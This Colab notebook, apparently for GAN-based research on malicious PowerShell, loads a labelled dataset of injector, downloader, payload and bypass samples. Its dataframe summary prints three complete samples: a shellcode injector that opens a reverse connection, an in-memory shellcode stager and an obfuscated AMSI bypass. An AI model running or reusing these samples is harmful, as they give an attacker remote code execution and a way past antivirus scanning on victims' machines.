{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "#GAN#\n"
      ],
      "metadata": {
        "id": "OyMyfUbGP_oR"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### load and view"
      ],
      "metadata": {
        "id": "vJaLOqu89v5l"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "W2bXVTl-Piel",
        "outputId": "19b4cf3d-f390-480f-8535-e8e178a99704"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\"/content/drive\", force_remount=True).\n",
            "Dataset loaded successfully.\n",
            "                                        Full Payload       Label  \\\n",
            "0  \\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....    Injector   \n",
            "1  \\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....  Downloader   \n",
            "2  \\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....    Injector   \n",
            "3  powershell.exe -nop -wind hidden -Exec Bypass ...     Payload   \n",
            "4  powershell -window hidden -enc $1 = '$c = ''[D...    Injector   \n",
            "\n",
            "                                        FusionVector  \n",
            "0  -0.18999852 -0.48553216 -0.87083316 0.2666215 ...  \n",
            "1  -0.3947524 0.010655806 -0.67612636 -0.07839656...  \n",
            "2  -0.1899367 -0.5148512 -0.90198445 0.2528152 -0...  \n",
            "3  -0.17432946 0.028123861 -0.5588947 -0.03192398...  \n",
            "4  -0.24262634 -0.5209265 -0.8235193 0.15971158 -...  \n"
          ]
        }
      ],
      "source": [
        "# prompt: load the dataset from from google drive with input urk\n",
        "\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "\n",
        "import pandas as pd\n",
        "\n",
        "# Replace 'your_file_path' with the actual path to your file in Google Drive\n",
        "file_path = '/content/drive/MyDrive/GAN/fusion_with_vector_extended.csv' #@param {type:\"string\"}\n",
        "\n",
        "try:\n",
        "  df = pd.read_csv(file_path)\n",
        "  print(\"Dataset loaded successfully.\")\n",
        "  # You can now work with the DataFrame 'df'\n",
        "  print(df.head())\n",
        "except FileNotFoundError:\n",
        "  print(f\"Error: File not found at {file_path}. Please check the file path.\")\n",
        "except Exception as e:\n",
        "  print(f\"An error occurred: {e}\")\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "df.head()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 293
        },
        "id": "CpLvych4S_QX",
        "outputId": "7de40ae3-eb38-4936-b138-314a50352310"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "                                        Full Payload       Label  \\\n",
              "0  \\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....    Injector   \n",
              "1  \\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....  Downloader   \n",
              "2  \\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....    Injector   \n",
              "3  powershell.exe -nop -wind hidden -Exec Bypass ...     Payload   \n",
              "4  powershell -window hidden -enc $1 = '$c = ''[D...    Injector   \n",
              "\n",
              "                                        FusionVector  \n",
              "0  -0.18999852 -0.48553216 -0.87083316 0.2666215 ...  \n",
              "1  -0.3947524 0.010655806 -0.67612636 -0.07839656...  \n",
              "2  -0.1899367 -0.5148512 -0.90198445 0.2528152 -0...  \n",
              "3  -0.17432946 0.028123861 -0.5588947 -0.03192398...  \n",
              "4  -0.24262634 -0.5209265 -0.8235193 0.15971158 -...  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-86277a19-d936-4f41-b5cb-358965cdd71a\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Full Payload</th>\n",
              "      <th>Label</th>\n",
              "      <th>FusionVector</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>\\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....</td>\n",
              "      <td>Injector</td>\n",
              "      <td>-0.18999852 -0.48553216 -0.87083316 0.2666215 ...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>\\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....</td>\n",
              "      <td>Downloader</td>\n",
              "      <td>-0.3947524 0.010655806 -0.67612636 -0.07839656...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>\\C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1....</td>\n",
              "      <td>Injector</td>\n",
              "      <td>-0.1899367 -0.5148512 -0.90198445 0.2528152 -0...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>powershell.exe -nop -wind hidden -Exec Bypass ...</td>\n",
              "      <td>Payload</td>\n",
              "      <td>-0.17432946 0.028123861 -0.5588947 -0.03192398...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>powershell -window hidden -enc $1 = '$c = ''[D...</td>\n",
              "      <td>Injector</td>\n",
              "      <td>-0.24262634 -0.5209265 -0.8235193 0.15971158 -...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-86277a19-d936-4f41-b5cb-358965cdd71a')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-86277a19-d936-4f41-b5cb-358965cdd71a button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-86277a19-d936-4f41-b5cb-358965cdd71a');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-0e04167b-002a-40af-a980-a1dfae1545b0\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-0e04167b-002a-40af-a980-a1dfae1545b0')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-0e04167b-002a-40af-a980-a1dfae1545b0 button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "variable_name": "df",
              "summary": "{\n  \"name\": \"df\",\n  \"rows\": 7676,\n  \"fields\": [\n    {\n      \"column\": \"Full Payload\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 4126,\n        \"samples\": [\n          \"\\\\C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe -EncodedCommand $6pVS = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $6pVS -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x15,0x80,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$2Ise=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($2Ise.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$2Ise,0,0,0);for (;;){Start-sleep 60};\",\n          \"Set-StrictMode -Version 2\\r\\n\\r\\nfunction func_get_proc_address {\\r\\n\\tParam ($var_module, $var_procedure)\\t\\t\\r\\n\\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\\r\\n\\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\\r\\n\\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\\r\\n}\\r\\n\\r\\nfunction func_get_delegate_type {\\r\\n\\tParam (\\r\\n\\t\\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\\r\\n\\t\\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\\r\\n\\t)\\r\\n\\r\\n\\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\\r\\n\\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\\r\\n\\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\\r\\n\\r\\n\\treturn $var_type_builder.CreateType()\\r\\n}\\r\\n\\r\\n$var_code=('120' ,'88' ,'195' ,'230' ,'244' ,'228' ,'200' ,'0' ,'0' ,'0' ,'61' ,'81' ,'61' ,'82' ,'86' ,'82' ,'90' ,'68' ,'45' ,'214' ,'105' ,'82' ,'157' ,'82' ,'104' ,'82' ,'157' ,'82' ,'32' ,'82' ,'157' ,'82' ,'2' ,'82' ,'122' ,'87' ,'82' ,'109' ,'89' ,'90' ,'87' ,'82' ,'45' ,'196' ,'87' ,'82' ,'45' ,'170' ,'16' ,'97' ,'94' ,'66' ,'47' ,'1' ,'61' ,'199' ,'196' ,'11' ,'61' ,'1' ,'199' ,'222' ,'193' ,'81' ,'61' ,'82' ,'157' ,'82' ,'2' ,'157' ,'96' ,'14' ,'82' ,'1' ,'202' ,'120' ,'126' ,'92' ,'24' ,'61' ,'90' ,'170' ,'194' ,'82' ,'24' ,'126' ,'95' ,'95' ,'82' ,'94' ,'90' ,'95' ,'82' ,'94' ,'90' ,'95' ,'82' ,'121' ,'182' ,'1' ,'61' ,'82' ,'189' ,'182' ,'95' ,'82' ,'157' ,'48' ,'211' ,'109' ,'189' ,'189' ,'189' ,'161' ,'0' ,'81' ,'166' ,'95' ,'84' ,'93' ,'84' ,'93' ,'97' ,'50' ,'0' ,'61' ,'90' ,'165' ,'167' ,'96' ,'165' ,'161' ,'61' ,'96' ,'95' ,'89' ,'36' ,'161' ,'105' ,'82' ,'45' ,'196' ,'82' ,'45' ,'210' ,'87' ,'45' ,'196' ,'87' ,'45' ,'196' ,'82' ,'82' ,'82' ,'96' ,'6' ,'126' ,'89' ,'161' ,'161' ,'161' ,'82' ,'186' ,'226' ,'89' ,'82' ,'1' ,'202' ,'127' ,'82' ,'186' ,'24' ,'0' ,'0' ,'0' ,'82' ,'189' ,'199' ,'11' ,'166' ,'190' ,'0' ,'0' ,'0' ,'195' ,'225' ,'195' ,'166' ,'0' ,'0' ,'0' ,'198' ,'170' ,'189' ,'189' ,'189' ,'11' ,'110' ,'91' ,'90' ,'91' ,'76' ,'11' ,'76' ,'100' ,'110' ,'91' ,'91' ,'11' ,'77' ,'63' ,'91' ,'91' ,'91' ,'76' ,'81' ,'91' ,'76' ,'91' ,'91' ,'91' ,'11' ,'106' ,'77' ,'63' ,'91' ,'91' ,'91' ,'11' ,'76' ,'91' ,'91' ,'76' ,'11' ,'91' ,'91' ,'91' ,'6' ,'84' ,'91' ,'91' ,'76' ,'6' ,'84' ,'91' ,'91' ,'76' ,'6' ,'9' ,'47' ,'1' ,'91' ,'91' ,'91' ,'6' ,'77' ,'91' ,'76' ,'92' ,'91' ,'6' ,'9' ,'47' ,'1' ,'91' ,'91' ,'91' ,'6' ,'94' ,'91' ,'91' ,'76' ,'95' ,'91' ,'6' ,'9' ,'47' ,'1' ,'91' ,'76' ,'91' ,'91' ,'76' ,'91' ,'6' ,'84' ,'91' ,'91' ,'76' ,'6' ,'94' ,'91' ,'91' ,'76' ,'6' ,'84' ,'91' ,'91' ,'76' ,'11' ,'91' ,'91' ,'91' ,'91' ,'76' ,'81' ,'91' ,'76' ,'91' ,'91' ,'91' ,'11' ,'61' ,'90' ,'165' ,'166' ,'91' ,'76' ,'97' ,'91' ,'76' ,'95' ,'95' ,'82' ,'1' ,'205' ,'221' ,'221' ,'45' ,'13' ,'29' ,'18' ,'29' ,'19' ,'29' ,'13' ,'29' ,'29' ,'18' ,'0' ,'68' ,'82' ,'36')\\r\\n\\r\\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\\r\\n\\t\\r\\n\\r\\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\\r\\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\\r\\n\\r\\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\\r\\n$var_runme.Invoke([IntPtr]::Zero)\\r\\n\\r\\n\",\n          \"$Dq9E=$null;$t6iarslIwX2lF=\\\"System.$(('M\\u00e1n\\u00e4'+'g\\u00eam\\u00ea'+'nt').NormaLIzE([CHar]([BYTe]0x46)+[CHaR](111*68/68)+[ChaR](114*68/68)+[CHar](109*52/52)+[cHaR]([BYte]0x44)) -replace [chaR](92+28-28)+[CHAr]([bYte]0x70)+[ChaR]([byTe]0x7b)+[chAr](77*70/70)+[cHar]([bYTE]0x6e)+[ChAR](125*86/86)).$([ChAR]([ByTe]0x41)+[cHar]([BYTE]0x75)+[chAR](11+105)+[Char](111)+[CHAR]([bYtE]0x6d)+[ChAr]([BYTe]0x61)+[ChaR](44+72)+[char]([byTE]0x69)+[chAr]([bytE]0x6f)+[cHaR](17+93)).$(('\\u00c4m'+'s\\u00ec'+'\\u00dbt'+'\\u00eel'+'s').NormAlizE([CHAR](70*49/49)+[ChaR](70+41)+[CHar](114*4/4)+[chAR](109+21-21)+[cHAR](68+44-44)) -replace [Char]([byTe]0x5c)+[ChAr]([byTE]0x70)+[Char]([BYTE]0x7b)+[ChAr]([bYtE]0x4d)+[Char](110*45/45)+[ChaR](125*18/18))\\\";$xsetigimzq=\\\"+('g'+'\\u00e0'+'x'+'h'+'f'+'m'+'z'+'\\u00f9'+'v'+'\\u00ee'+'\\u00ec'+'w'+'x'+'t'+'q'+'m'+'m'+'q'+'l'+'v').noRMAlIze([chAR](70*12/12)+[cHaR](111)+[ChaR](62+52)+[chaR]([BYTe]0x6d)+[Char]([BYTe]0x44)) -replace [Char]([BYTE]0x5c)+[cHAR](112*19/19)+[CHAR]([byTE]0x7b)+[CHAr]([BYte]0x4d)+[CHAr](19+91)+[CHAr]([BYte]0x7d)\\\";[Threading.Thread]::Sleep(1485);[Runtime.InteropServices.Marshal]::(\\\"$([chAR]([BYTe]0x57)+[CHar](94+20)+[cHaR](42+63)+[ChaR](116+106-106)+[cHAr]([BYTe]0x65)+[char](73+26-26)+[cHAr]([BYtE]0x6e)+[chAR](116*87/87)+[CHAr]([ByTE]0x33)+[ChAr](50+42-42))\\\")([Ref].Assembly.GetType($t6iarslIwX2lF).GetField(\\\"$([cHAR](2+95)+[chaR](92+17)+[cHAr]([bYte]0x73)+[Char]([Byte]0x69)+[cHAr](67+6-6)+[CHaR](111*13/13)+[CHAr]([BYtE]0x6e)+[CHaR](50+66)+[ChAr]([BYte]0x65)+[Char]([BYtE]0x78)+[cHaR]([BYTe]0x74))\\\",[Reflection.BindingFlags]\\\"NonPublic,Static\\\").GetValue($Dq9E),0x27228920);$ggtqvadhjxxjh=\\\"+[cHar]([bYtE]0x67)+[CHAR](100+91-91)+[Char](97+52-52)+[chaR](117*115/115)+[chaR](99+12-12)+[chAr]([bytE]0x64)+[CHAR](97)+[CHar](113+64-64)+[chAr]([ByTe]0x71)+[ChaR](110)+[Char]([byTE]0x7a)+[Char]([byte]0x6b)+[chaR]([ByTE]0x62)+[CHaR](55+52)+[cHaR]([Byte]0x69)+[cHar]([bYTE]0x76)+[chAr](118)\\\";[Threading.Thread]::Sleep(140)\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"Label\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 5,\n        \"samples\": [\n          \"Downloader\",\n          \"Bypass\",\n          \"Payload\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"FusionVector\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 5623,\n        \"samples\": [\n          \"-0.5182965 -0.42351618 -0.57260126 -0.3397501 -0.71612144 -0.1755799 -0.20532559 -0.14185345 0.4681033 -0.24179272 0.14162484 -0.47918802 -0.75505793 -0.08259973 0.053940903 -0.5901104 0.30950347 0.8079757 -0.18181023 -0.24596189 -0.5413142 0.15776446 -0.19947056 -0.4064588 0.41001502 0.13324918 0.51188654 -0.6504125 -0.19896683 -0.12516208 0.5921669 0.44036403 -0.008565576 0.5250444 -0.50043 0.14855929 -0.4397032 0.07637892 -0.024577755 -0.35489917 0.3428063 0.35620362 -0.50494665 0.52043474 0.100903235 -0.0080936225 -0.21521676 0.2947848 -0.015673565 -0.21868326 0.26359868 -0.015035751 0.30292132 0.3202357 -0.1357686 0.44448254 -0.06750834 -0.11615171 0.33846757 1.3351763 -0.050512053 0.44632328 0.00070809847 -0.051066514 -0.04236756 -0.01791743 0.070028536 0.045298778 -0.07894387 0.3274241 -0.08082962 0.01973166 -0.0817692 0.28636777 0.54402065 -0.18086764 0.10906657 -0.08079903 0.7814504 -0.1816661 0.0072796554 0.07867057 -0.3746048 0.39983588 0.2942065 0.19717179 0.08839455 -0.03281899 -0.483936 0.30522376 0.12229899 0.19026807 0.076492876 0.6433353 0.2675304 -0.03844121 0.035410035 0.3533018 -0.32359353 -0.44476083 0.1754425 -0.2556757 0.0010544901 -0.42284402 0.04013124 -0.011458815 0.34686285 0.17332041 0.37083253 0.4142985 0.13971984 -0.33146176 0.21392249 -0.16118823 0.013562958 -0.06462411 -0.043848142 -0.4793745 -0.5393668 -0.109075546 0.2669478 -0.5750623 0.22221185 0.28332034 -0.36512828 0.274729 0.20943072 -0.0065463493 0.33981407 0.3290563 1.3426098 -0.7204102 -0.33568358 -0.48352885 0.2926472 -0.37447613 -0.49313894 -0.053373903 0.24391635 0.09812606 -1.3551904 0.8146881 0.9292118 -0.50182855 0.5792933 -0.97977835 0.53110975 0.6446699 -0.66119343 0.18062143 0.08726518 1.2657186 0.07478769 -0.068486735 -0.4807232 1.0242705 -0.5784563 0.20132843 -0.12191666 0.63357073 0.33593345 0.3873571 0.21800983 -1.8974724 -0.19842061 -0.6546036 -0.122658275 0.34746942 0.05684826 0.1693244 -0.4082475 -0.30724174 -0.44025424 -0.110965446 0.8363336 1.1541809 0.7801999 